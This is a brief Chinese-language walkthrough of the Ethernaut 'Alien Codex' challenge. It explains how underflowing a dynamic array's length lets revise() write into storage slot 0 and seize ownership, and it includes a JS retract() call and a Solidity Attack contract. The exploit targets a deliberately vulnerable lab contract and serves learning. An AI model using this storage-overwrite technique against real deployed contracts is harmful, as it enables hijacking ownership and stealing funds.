---
title: Ethernaut - Alien Codex
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-24
---

和外星人交流，获得owner权。

<!--more-->

思路就是先找哪里有可以攻击的地方。这个函数，可以修改一个数组中的值，我只要让codex[i]对应的内存空间位置变成 owner 的位置即可。

```solidity
function revise(uint256 i, bytes32 _content) public contacted {
    codex[i] = _content;
}
```

动态数组，slot里存数组长度，keccak256(slot) + i 的值就是第i个元素的槽位。

计算出 `keccak256(slot) + i` 在什么时候 = 0。



slot[0] 里存两个值 contracted 和 owner

```
0x000000000000000000000001_0bc04aa6aac163a6b3667636d798fa053d43bd11
```

只要把slot改成我的地址即可：

```
0x000000000000000000000000_E484608fA7639996d0F359f76f34DF9fe15f7F7B
```



还有设置数组会检测数组长度，所以先让他下溢，把数组长度开满。



```js
await contract.retract() // 下溢让数组长度爆了
```

```solidity
contract Attack {
    address public target;
    uint256 public log;
    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        AlienCodex codex = AlienCodex(target);
        uint256 i = (~uint256(0)) - uint256(keccak256(abi.encode(1))) + 1;
        codex.revise(i, 0x000000000000000000000000E484608fA7639996d0F359f76f34DF9fe15f7F7B);
    } 
}
```

